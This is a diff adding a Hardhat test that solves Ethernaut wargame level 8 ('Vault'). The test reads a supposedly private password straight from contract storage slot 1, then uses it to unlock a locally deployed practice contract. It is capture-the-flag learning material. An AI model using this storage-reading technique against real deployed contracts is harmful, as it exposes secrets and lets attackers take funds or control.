@@ -89,4 +89,14 @@ describe("Ethernaut", function () {
 			assert(balanceNew > balanceOld, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
 		});
 	});
+
+	describe("Level 8 - Vault", async () => {
+		it("Exploit", async () => {
+			const contract = await ethers.deployContract("Vault", [ethers.encodeBytes32String("ethernaut8")]); // the password is stored in the contract storage which is public
+			const passwordCurrent = await ethers.provider.getStorage(contract, 1); // retrieve the password from the contract storage
+			await contract.unlock(passwordCurrent);
+			const lockedCurrent = await contract.locked();
+			assert(!lockedCurrent, "Failed to pass level 8."); // unlock to pass the level
+		});
+	});
 });
